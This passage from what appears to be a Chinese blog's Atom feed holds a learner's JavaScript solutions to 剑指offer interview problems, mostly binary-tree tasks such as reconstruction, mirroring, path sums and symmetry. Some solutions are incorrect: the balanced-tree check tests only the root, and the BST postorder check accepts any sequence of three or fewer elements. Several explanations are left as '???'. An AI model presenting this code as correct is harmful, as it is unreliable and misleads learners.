class="keyword">array</span>[i+<span class="number">1</span>];</div><div class="line">        b[i]*=temp;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> b;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：???</p><blockquote><p>六十四、滑动窗口的最大值 ？？？</p></blockquote><p><strong>描述</strong>：给定一个数组和滑动窗口的大小，找出所有滑动窗口里数值的最大值。例如，如果输入数组{2,3,4,2,6,2,5,1}及滑动窗口的大小3，那么一共存在6个滑动窗口，他们的最大值分别为{4,4,6,6,6,5}； 针对数组{2,3,4,2,6,2,5,1}的滑动窗口有以下6个： {[2,3,4],2,6,2,5,1}， {2,[3,4,2],6,2,5,1}， {2,3,[4,2,6],2,5,1}， {2,3,4,[2,6,2],5,1}， {2,3,4,2,[6,2,5],1}， {2,3,4,2,6,[2,5,1]}。<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">function maxInWindows(<span class="built_in">num</span>, size)&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="built_in">num</span>.<span class="built_in">length</span>===<span class="number">0</span> || size===<span class="number">0</span>)&#123;<span class="built_in">return</span> [];&#125;</div><div class="line">    <span class="built_in">var</span> result=[];</div><div class="line">    <span class="built_in">var</span> count=<span class="built_in">num</span>.<span class="built_in">length</span>-size;</div><div class="line">    <span class="keyword">for</span>(<span class="built_in">var</span> i=<span class="number">0</span>;i&lt;=count;i++)&#123;</div><div class="line">        <span class="built_in">var</span> temp=<span class="built_in">num</span>.slice(i,i+size);</div><div class="line">        result.<span class="built_in">push</span>(Math.<span class="built_in">max</span>.<span class="built_in">apply</span>(this,temp));</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：???</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;一、 二维数组中的查找 p44&lt;br&gt;&lt;strong&gt;描述&lt;/strong&gt;：在一个二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。&lt;b
      
    
    </summary>
    
    
      <category term="剑指offer" scheme="wangsiyuan233.github.io/tags/%E5%89%91%E6%8C%87offer/"/>
    
  </entry>
  
  <entry>
    <title>剑指offer(2)--二叉树篇(JavaScript版)/共 题</title>
    <link href="wangsiyuan233.github.io/2018/10/06/77%E5%89%91%E6%8C%87-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%AF%87/"/>
    <id>wangsiyuan233.github.io/2018/10/06/77剑指-二叉树篇/</id>
    <published>2018-10-06T10:59:44.000Z</published>
    <updated>2018-10-06T12:01:38.758Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>四、 重建二叉树 p62</p></blockquote><p><strong>描述</strong>：输入某二叉树的前序遍历和中序遍历的结果，请重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。例如输入前序遍历序列{1,2,4,7,3,5,6,8}和中序遍历序列{4,7,2,1,5,3,8,6}，则重建二叉树并返回。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">reConstructBinaryTree</span>(<span class="params">pre, vin</span>)</span>&#123; <span class="comment">//pre 是前序遍历，vin 是中序遍历</span></div><div class="line">  <span class="comment">// null 是真正的空，[] 里面还有东西</span></div><div class="line">    <span class="keyword">var</span> result =<span class="literal">null</span>;</div><div class="line">    <span class="keyword">if</span>(pre.length&gt;<span class="number">1</span>)&#123;</div><div class="line">      <span class="keyword">var</span> root = pre[<span class="number">0</span>];</div><div class="line">      <span class="comment">// indexOf() 方法可返回某个指定的字符串值首次出现的位置。</span></div><div class="line">      <span class="comment">// 下面开始中序遍历</span></div><div class="line">      <span class="comment">// 找到根节点的位置</span></div><div class="line">      <span class="keyword">var</span> vinRootIndex = vin.indexOf(root);</div><div class="line">      <span class="comment">// 根节点的左边是左子树</span></div><div class="line">      <span class="keyword">var</span> vinLeft = vin.slice(<span class="number">0</span>,vinRootIndex);</div><div class="line">      <span class="comment">// 右边就是右子树</span></div><div class="line">      <span class="keyword">var</span> vinRight = vin.slice(vinRootIndex+<span class="number">1</span>,vin.length);</div><div class="line">      <span class="comment">// 下面开始前序遍历：</span></div><div class="line">      <span class="comment">// shift() 把数组的第一个元素从其中删除，并返回第一个元素的值</span></div><div class="line">      <span class="comment">// 取走第一个数</span></div><div class="line">      pre.shift();</div><div class="line">      <span class="comment">// 此时的第一个数是左子树的第一个数</span></div><div class="line">      <span class="keyword">var</span> preLeft = pre.slice(<span class="number">0</span>,vinLeft.length);</div><div class="line">      <span class="keyword">var</span> preRight = pre.slice(vinLeft.length,pre.length);</div><div class="line">      result=&#123;</div><div class="line">        <span class="attr">val</span>:root,</div><div class="line">        <span class="attr">left</span>:reConstructBinaryTree(preLeft,vinLeft),</div><div class="line">        <span class="attr">right</span>:reConstructBinaryTree(preRight,vinRight)</div><div class="line">      &#125;</div><div class="line"></div><div class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(pre.length ===<span class="number">1</span>)&#123;</div><div class="line">        result= &#123;</div><div class="line">            <span class="attr">val</span> :pre[<span class="number">0</span>],</div><div class="line">            <span class="attr">left</span>:<span class="literal">null</span>,</div><div class="line">            <span class="attr">right</span>:<span class="literal">null</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、函数里面的参数 <code>pre</code> 是前序遍历，<code>vin</code> 是中序遍历；<br>2、第一步我们进行的是中序遍历：<br>3、前序的第一个点就是根节点，用 <code>indexOf</code> 找到根节点的位置；<br>4、中序遍历中，根节点前面就是左子树，根节点后面就是右子树<br>5、第二步我们开始前序遍历：<br>6、取出根节点！很重要<br>7、用中序遍历中左子树<strong>的长度</strong>，可以知道前序遍历的左子树<br>8、同理可以得到前序遍历的右子树<br>9、第三步就是 <strong>递归</strong><br>10、你不是让我重构这个二叉树吗？OK，我的整体左子树也有小左子树和小右子树啊<br>11、这个时候，“根节点”变了，逻辑却没变，还是用开始的大函数。<br><a id="more"></a></p><blockquote><p>十七、树的子结构 p148</p></blockquote><p><strong>描述</strong>：输入两棵二叉树A，B，判断B是不是A的子结构。（ps：我们约定空树不是任意一个树的子结构）<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 第一步判断 大树 和 小树 的左右腿长度都是一样的吧？</span></div><div class="line">function HasSubtree(pRoot1, pRoot2)&#123; </div><div class="line">   <span class="comment">//当 大树 和 小树 都不为零的时候，才进行比较。否则直接返回false</span></div><div class="line">   <span class="keyword">if</span> (pRoot1 == <span class="literal">null</span> || pRoot2 == <span class="literal">null</span>)&#123;</div><div class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">   &#125;</div><div class="line">    <span class="keyword">return</span> isSubtree(pRoot1, pRoot2)</div><div class="line">    <span class="comment">//如果找不到，那么就再去root的左儿子当作起点，去判断时候包含 小 树</span></div><div class="line">        || HasSubtree(pRoot1.left, pRoot2)</div><div class="line">    <span class="comment">//如果还找不到，那么就再去root的右儿子当作起点，去判断时候包含 大 树</span></div><div class="line">        || HasSubtree(pRoot1.right, pRoot2);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 第二步判断两棵树是否有相同的值</span></div><div class="line">function isSubtree(root1, root2)&#123; </div><div class="line">    <span class="comment">//如果小树已经遍历完了都能对应的上，返回true</span></div><div class="line">    <span class="keyword">if</span> (root2 == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    <span class="comment">//如果小树还没有遍历完，大树却遍历完了。返回false</span></div><div class="line">    <span class="keyword">if</span> (root1 == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">      <span class="comment">//如果找到了对应小树的根节点的点</span></div><div class="line">    <span class="keyword">if</span> (root1.<span class="keyword">val</span> == root2.<span class="keyword">val</span>) &#123;</div><div class="line">      <span class="comment">//以这个根节点为起点判断大树是否包含小树</span></div><div class="line">      <span class="comment">// 如果有相同的值，就递归判断下面的 子树 是不是也相等</span></div><div class="line">        <span class="keyword">return</span> isSubtree(root1.left, root2.left)</div><div class="line">          &amp;&amp; isSubtree(root1.right, root2.right);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、在大树里找到小树的根节点那个数R；<br>2、再判断他们下面的结构是不是一样的</p><blockquote><p>十八、二叉树的镜像 p157</p></blockquote><p><strong>描述</strong>：操作给定的二叉树，将其变换为源二叉树的镜像。<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">function <span class="type">Mirror</span>(root)&#123;</div><div class="line">    <span class="keyword">if</span>(root == null)&#123;</div><div class="line">        <span class="keyword">return</span> ;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// 下面这个是左右手交换的意思吧</span></div><div class="line">    <span class="keyword">var</span> temp=root.<span class="keyword">left</span>;</div><div class="line">    root.<span class="keyword">left</span>=root.<span class="keyword">right</span>;</div><div class="line">    root.<span class="keyword">right</span>=temp;</div><div class="line">    </div><div class="line">    <span class="keyword">if</span>(root.<span class="keyword">left</span>) <span class="type">Mirror</span>(root.<span class="keyword">left</span>);</div><div class="line">    <span class="keyword">if</span>(root.<span class="keyword">right</span>) <span class="type">Mirror</span>(root.<span class="keyword">right</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、前序遍历首先访问 根结点 然后遍历左子树，最后遍历右子树。在遍历左、右子树时，仍然先访问根结点，然后遍历左子树，最后遍历右子树；<br>2、交换左右手</p><blockquote><p>二十二 从上往下打印二叉树 p171</p></blockquote><p><strong>描述</strong>：从上往下打印出二叉树的每个节点，同层节点从左至右打印。<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">function PrintFromTopToBottom(root)&#123;</div><div class="line">    var <span class="attr">arr=</span>[];</div><div class="line">    var <span class="attr">data=</span>[];</div><div class="line">    if(root!=null)&#123;</div><div class="line">      // 空数组后面首先跟着的是 根节点</div><div class="line">        arr.push(root);</div><div class="line">    &#125;</div><div class="line">    while(arr.length!=<span class="number">0</span>)&#123;</div><div class="line">      // <span class="keyword">node</span> <span class="title">是节点，root</span> 是根节点</div><div class="line">        var <span class="keyword">node</span><span class="title">=arr</span>.shift();</div><div class="line">        // 第一元素的左子树不为空时，把左子树加在 arr 后面</div><div class="line">        if(<span class="keyword">node</span>.<span class="title">left</span>!=null)&#123;</div><div class="line">            arr.push(<span class="keyword">node</span>.<span class="title">left</span>);</div><div class="line">        &#125;</div><div class="line">        if(<span class="keyword">node</span>.<span class="title">right</span>!=null)&#123;</div><div class="line">            arr.push(<span class="keyword">node</span>.<span class="title">right</span>);</div><div class="line">        &#125;</div><div class="line">        // 首先取得了 arr 的第一个节点 <span class="keyword">node</span><span class="title">，接着是 左子节点 ，最后是右子节点</span></div><div class="line">        // 这个过程是循环的，不断的是 首 -- 左 -- 右</div><div class="line">        // 所以为什么需要一个 data 空数组？？？</div><div class="line">        data.push(<span class="keyword">node</span>.<span class="title">val</span>);</div><div class="line">    &#125;</div><div class="line">    return data;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：引申一下：打印前序遍历会吗？中序会吗？</p><blockquote><p>二十三、二叉搜索树的后序遍历序列 p179</p></blockquote><p><strong>描述</strong>：输入一个整数数组，判断该数组是不是某二叉搜索树的后序遍历的结果。如果是则输出Yes,否则输出No。假设输入的数组的任意两个数字都互不相同。<br><figure class="highlight verilog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">function</span> VerifySquenceOfBST(<span class="keyword">sequence</span>)&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">sequence</span>==<span class="literal">null</span>||<span class="keyword">sequence</span><span class="variable">.length</span>&lt;=<span class="number">0</span>)&#123;</div><div class="line">        <span class="keyword">return</span> false;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> Verify(<span class="keyword">sequence</span>);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"><span class="keyword">function</span> Verify(<span class="keyword">sequence</span>)&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">sequence</span><span class="variable">.length</span>&lt;=<span class="number">3</span>)&#123;</div><div class="line">        <span class="keyword">return</span> true;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> root=<span class="keyword">sequence</span>[<span class="keyword">sequence</span><span class="variable">.length</span>-<span class="number">1</span>];<span class="comment">//根节点</span></div><div class="line">    <span class="keyword">var</span> left=[];</div><div class="line">    <span class="keyword">var</span> right=[];</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sequence</span><span class="variable">.length</span>; i++)&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">sequence</span>[i]&gt;=root)&#123;<span class="comment">//[0,i-1]就是左子树，[i,length-1]右子树</span></div><div class="line">            left=<span class="keyword">sequence</span><span class="variable">.slice</span>(<span class="number">0</span>,i);</div><div class="line">            right=<span class="keyword">sequence</span><span class="variable">.slice</span>(i,<span class="keyword">sequence</span><span class="variable">.length</span>-<span class="number">1</span>);<span class="comment">//注意slice是左闭右开</span></div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(right<span class="variable">.length</span>===<span class="number">0</span>)&#123;</div><div class="line">        <span class="keyword">return</span> true;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j=i;j&lt;<span class="keyword">sequence</span><span class="variable">.length</span>-<span class="number">1</span>;j++)&#123; <span class="comment">//刚开始写的right.length</span></div><div class="line">        <span class="keyword">if</span>(<span class="keyword">sequence</span>[j]&lt;root)&#123; <span class="comment">//不是right[j]而是sequence[j];</span></div><div class="line">            <span class="keyword">return</span> false;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> leftResult = Verify(left);</div><div class="line">    <span class="keyword">var</span> rightResult = Verify(right);</div><div class="line">    <span class="keyword">return</span> leftResult &amp;&amp; rightResult;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>BST的后序序列的合法序列是，对于一个序列S，最后一个元素是x （也就是根），如果去掉最后一个元素的序列为T，那么T满足：T可以分成两段，前一段（左子树）小于x，后一段（右子树）大于x，且这两段（子树）都是合法的后序序列。完美的递归定义 : ) 。</p><blockquote><p>二十四、二叉树中和为某一值的路径 p182</p></blockquote><p><strong>描述</strong>：输入一颗二叉树的根节点和一个整数，打印出二叉树中节点值的和为输入整数的所有路径。路径定义为从树的根结点开始往下一直到叶结点所经过的结点形成一条路径。(注意: 在返回值的list中，数组长度大的数组靠前)<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindPath</span>(<span class="params">root, expectNumber</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> result = [];</div><div class="line">    <span class="keyword">if</span> (root === <span class="literal">null</span>) &#123;</div><div class="line">        <span class="keyword">return</span> [];</div><div class="line">    &#125;</div><div class="line">    dfsFind(root, expectNumber, [], <span class="number">0</span>, result);</div><div class="line">    <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">dfsFind</span>(<span class="params">root, expectNumber, path, currentSum, result</span>) </span>&#123;</div><div class="line">    <span class="comment">//前序遍历二叉树，每次更新当前路径的和 currentSum；</span></div><div class="line">    currentSum += root.val;</div><div class="line">    path.push(root.val);</div><div class="line"></div><div class="line">    <span class="comment">//判断 currentSum 是否等于 expectNumber,以及 当前结点是否是叶子结点。如果是，把当前路径保存在 result 结果中；</span></div><div class="line">    <span class="keyword">if</span> (currentSum == expectNumber &amp;&amp; root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</div><div class="line">        result.push(path.slice(<span class="number">0</span>));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (root.left != <span class="literal">null</span>) &#123;</div><div class="line">        dfsFind(root.left, expectNumber, path, currentSum, result);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (root.right != <span class="literal">null</span>) &#123;</div><div class="line">        dfsFind(root.right, expectNumber, path, currentSum, result);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 这一步很关键，把所有push进去的每一个元素在递归执行完成之时都弹出来，使得stack每次都是重头来过</span></div><div class="line">    path.pop();</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：？？？？</p><blockquote><p>二十六、二叉搜索树与双向链表 p191</p></blockquote><p><strong>描述</strong>：输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的双向链表。要求不能创建任何新的结点，只能调整树中结点指针的指向。<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">function <span class="type">Convert</span>(pRootOfTree)&#123;</div><div class="line">    <span class="keyword">if</span>(pRootOfTree == null)&#123;<span class="keyword">return</span> null;&#125;</div><div class="line">    <span class="keyword">if</span>(pRootOfTree.<span class="keyword">right</span> == null &amp;&amp; pRootOfTree.<span class="keyword">left</span> == null) &#123;</div><div class="line">      <span class="keyword">return</span> pRootOfTree;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// 1.将左子树构造成双链表，并返回链表头节点</span></div><div class="line">    <span class="keyword">var</span> <span class="keyword">left</span> = <span class="type">Convert</span>(pRootOfTree.<span class="keyword">left</span>);</div><div class="line">    <span class="keyword">var</span> p =<span class="keyword">left</span>;</div><div class="line">    <span class="comment">// 2.定位至左子树双链表最后一个节点</span></div><div class="line">    <span class="keyword">while</span>(p!=null&amp;&amp;p.<span class="keyword">right</span>!=null)&#123;p = p.<span class="keyword">right</span>;&#125;</div><div class="line">    <span class="comment">// 3.如果左子树链表不为空的话，将当前root追加到左子树链表</span></div><div class="line">    <span class="keyword">if</span>(<span class="keyword">left</span>!=null)&#123;</div><div class="line">        p.<span class="keyword">right</span> = pRootOfTree;</div><div class="line">        pRootOfTree.<span class="keyword">left</span> = p;</div><div class="line">    &#125;</div><div class="line">     <span class="comment">// 4.将右子树构造成双链表，并返回链表头节点</span></div><div class="line">    <span class="keyword">var</span> <span class="keyword">right</span> = <span class="type">Convert</span>(pRootOfTree.<span class="keyword">right</span>);</div><div class="line">     <span class="comment">// 5.如果右子树链表不为空的话，将该链表追加到 root 节点之后</span></div><div class="line">    <span class="keyword">if</span>(<span class="keyword">right</span>)&#123;</div><div class="line">        <span class="keyword">right</span>.<span class="keyword">left</span> = pRootOfTree;</div><div class="line">        pRootOfTree.<span class="keyword">right</span> = <span class="keyword">right</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// 6.根据左子树链表是否为空确定返回的节点。</span></div><div class="line">    <span class="keyword">return</span> <span class="keyword">left</span>!==null?<span class="keyword">left</span>:pRootOfTree;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：？？？？</p><blockquote><p>三十八、二叉树的深度 p271</p></blockquote><p><strong>描述</strong>：输入一棵二叉树，求该树的深度。从根结点到叶结点依次经过的结点（含根、叶结点）形成树的一条路径，最长路径的长度为树的深度。<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">function <span class="type">TreeDepth</span>(pRoot)&#123;</div><div class="line">    <span class="keyword">if</span>(!pRoot) <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    <span class="keyword">var</span> <span class="keyword">left</span> = <span class="number">1</span> + <span class="type">TreeDepth</span>(pRoot.<span class="keyword">left</span>);</div><div class="line">    <span class="keyword">var</span> <span class="keyword">right</span> = <span class="number">1</span>+ <span class="type">TreeDepth</span>(pRoot.<span class="keyword">right</span>);</div><div class="line">    <span class="keyword">return</span> <span class="type">Math</span>.<span class="built_in">max</span>(<span class="keyword">left</span>,<span class="keyword">right</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：????</p><blockquote><p>三十九、平衡二叉树 p273</p></blockquote><p><strong>描述</strong>：输入一棵二叉树，判断该二叉树是否是平衡二叉树。如果某二叉树中任意节点的左右子树的深度相差不超过1，那么它就是一棵平衡二叉树。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">IsBalanced_Solution</span>(<span class="params">pRoot</span>)</span>&#123; <span class="comment">// 根节点</span></div><div class="line">    <span class="keyword">if</span>(!pRoot) <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.abs(height(pRoot.left)-height(pRoot.right))&lt;=<span class="number">1</span>;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">height</span>(<span class="params">node</span>)</span>&#123; <span class="comment">// 普通节点</span></div><div class="line">      <span class="comment">// 压根不存在普通节点，那就只有根节点，单数就不算平衡吧哈哈</span></div><div class="line">        <span class="keyword">if</span>(!node) <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">      <span class="comment">// 根节点的左边不存在 且 根节点的右边不存在，算平衡</span></div><div class="line">        <span class="keyword">if</span>(!(node.left) &amp;&amp; !(node.right)) <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">      <span class="comment">// 正常的左右子树的节点都存在，那就比较一下，取最大值</span></div><div class="line">        <span class="keyword">return</span> <span class="built_in">Math</span>.max(height(node.left),height(node.right))+<span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：用后序遍历的方法，就可以一边遍历一边判断每个节点是不是平衡的了。</p><blockquote><p>五十七、二叉树的下一个结点 p65</p></blockquote><p><strong>描述</strong>：给定一个二叉树和其中的一个结点，请找出中序遍历顺序的下一个结点并且返回。注意，树中的结点不仅包含左右子结点，同时包含指向父结点的指针。<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">function GetNext(pNode)&#123;</div><div class="line">    <span class="keyword">if</span>(!pNode)&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;    <span class="comment">// 空指针</span></div><div class="line">    var p = <span class="keyword">null</span>;</div><div class="line">    <span class="keyword">if</span>(pNode.right)&#123;            <span class="comment">// 存在右子树</span></div><div class="line">        p = pNode.right;</div><div class="line">        <span class="keyword">while</span>(p.left)&#123;</div><div class="line">            p = p.left;</div><div class="line">        &#125;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;                      <span class="comment">// 不存在右子树</span></div><div class="line">        p = pNode.<span class="keyword">next</span>;</div><div class="line">        <span class="keyword">if</span>(pNode.<span class="keyword">next</span> &amp;&amp; pNode.<span class="keyword">next</span>.right == pNode)&#123;</div><div class="line">            <span class="keyword">while</span>(p.<span class="keyword">next</span> &amp;&amp; p.<span class="keyword">next</span>.right == p)&#123;</div><div class="line">                p = p.<span class="keyword">next</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span>(p.<span class="keyword">next</span> == <span class="keyword">null</span>)&#123;</div><div class="line">                p =  <span class="keyword">null</span>;</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                p = p.<span class="keyword">next</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> p;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：???</p><blockquote><p>五十八、对称的二叉树 p159</p></blockquote><p><strong>描述</strong>：请实现一个函数，用来判断一棵二叉树是不是对称的。注意，如果一个二叉树同此二叉树的镜像是同样的，定义其为对称的。<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">function isSymmetrical(pRoot)&#123;</div><div class="line">  <span class="keyword">if</span>(pRoot==null)&#123;</div><div class="line">      <span class="keyword">return</span> <span class="literal">true</span></div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> judge(pRoot.<span class="keyword">left</span>,pRoot.<span class="keyword">right</span>)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 竟然还有 .left 和 .right 这种方法</span></div><div class="line">function judge(<span class="keyword">left</span>,<span class="keyword">right</span>)&#123;</div><div class="line">  <span class="keyword">if</span>(<span class="keyword">left</span>==null)&#123;<span class="keyword">return</span> <span 